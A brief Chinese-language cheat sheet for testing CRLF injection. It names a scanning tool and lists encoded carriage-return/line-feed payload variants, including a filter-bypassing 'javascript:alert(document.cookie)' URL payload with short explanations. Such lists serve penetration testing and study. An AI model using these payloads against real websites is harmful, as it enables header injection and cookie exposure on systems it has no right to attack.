# CRLF注入

工具：[CRLFsuite](https://github.com/Nefcore/CRLFsuite)

测试是否存在CRLF注入所使用的符号

\r\n

%0D%0A

%0D或%0A

回车换行符的ASCII符号，例如0x0D0x0A

回车换行符的utf-8，例如 %E5%98%8A%E5%98%8D
> 原理
> %E5%98%8A经过Unicode解码变为U+560A，去除无用字符后最后取0A
>
> %E5%98%8D同理

回车换行符的Unicode，例如 \u560d\u560a

注入大量字符串，例如 +++++++ 7000 bytes +++++++

编过码的回车或者换行,例如: %3F%0D , %23%0D , %3F%0A 或者 %23%0A

/x:1/:///%01javascript:alert(document.cookie)/
> 原理
> 
> /x:1/：这是一个无效的URL协议，它被用来欺骗浏览器，使其认为这是一个合法的URL。
> 
> :///：这是一个URL协议分隔符，它表示URL的协议部分结束，接下来的部分是主机名或路径。
> 
> %01：这是一个十六进制转义字符，它表示ASCII值为1的字符。这个字符经常被黑客用来绕过一些安全检测机制。
>
> javascript:alert(document.cookie)：这是一个Javascript代码段，它会在浏览器中弹出当前页面的Cookie信息。这段代码被嵌入到URL字符串中，并且以javascript:伪协议的形式出现，浏览器解析URL时会将其作为Javascript代码来执行。